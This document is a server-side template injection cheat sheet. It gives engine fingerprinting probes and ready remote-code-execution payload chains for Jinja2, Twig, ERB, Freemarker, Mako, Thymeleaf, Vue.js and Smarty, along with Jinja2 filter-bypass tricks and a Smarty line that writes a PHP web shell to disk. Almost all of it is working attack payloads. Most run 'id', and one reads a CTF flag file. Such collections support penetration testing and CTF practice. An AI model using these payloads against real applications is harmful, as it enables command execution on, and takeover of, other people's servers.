# SSTI Injection chain cheat sheet

## Template engine identification

| test payload | If the rendering result is | engine |
|-------------|--------------|------|
| `{{7*7}}` | `49` | Jinja2 / Twig / Twig |
| `{{7*7}}` | `{{7*7}}` | no Jinja2/Twig |
| `${7*7}` | `49` | Freemarker / Velocity / Mako |
| `#{7*7}` | `49` | Thymeleaf / Ruby ERB |
| `<%= 7*7 %>` | `49` | ERB (Ruby) |
| `${7*7}` | `${49}` | Freemarker |
| `#{7*7}` | `#{49}` | Thymeleaf |
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |
| `{{config}}` | Configuration object | Jinja2 / Twig |

## Jinja2 injection chain

### Basic command execution
```python
# method1:os.popen
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}

# method2:direct import
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}

# method3:lipsum
{{lipsum.__globals__['os'].popen('id').read()}}

# method4:cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# method5:joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}

# method6:namespace
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

### Find subclass index
```python
# List all available subclasses
{{''.__class__.__mro__[1].__subclasses__()}}

# Find the index of a specific class
{% for i,c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{i}}{% endif %}{% endfor %}

# Common subcategory index
# catch_warnings: usually in 132-140 between
# Popen: usually in 200+ between
# _io._IOBase: usually in 80-100 between
```

### filter bypass
```python
# Point numbers are filtered → use |attr
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}

# Underlines are filtered → use \x5f or request
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
{{''|attr(request.args.c)}}&c=__class__

# Square brackets are filtered → use |attr + __getitem__
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}

# Keywords are filtered → Splicing
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['po'+'pen']('id').read()}}
```

## Twig injection chain

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /flag']|filter('system')}}
```

## ERB (Ruby) injection chain

```ruby
<%= system('id') %>
<%= `id` %>
<%= exec('id') %>
<%= IO.popen('id').readlines() %>
```

## Freemarker injection chain

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

## Mako injection chain

```python
${__import__('os').popen('id').read()}
<% import os %>${os.popen('id').read()}
```

## Thymeleaf injection chain

```
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
[[${new java.lang.ProcessBuilder({'id'}).start()}]]
```

## Vue.js template injection

```javascript
{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id').toString()}}
```

## Smarty injection chain

```
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}
```
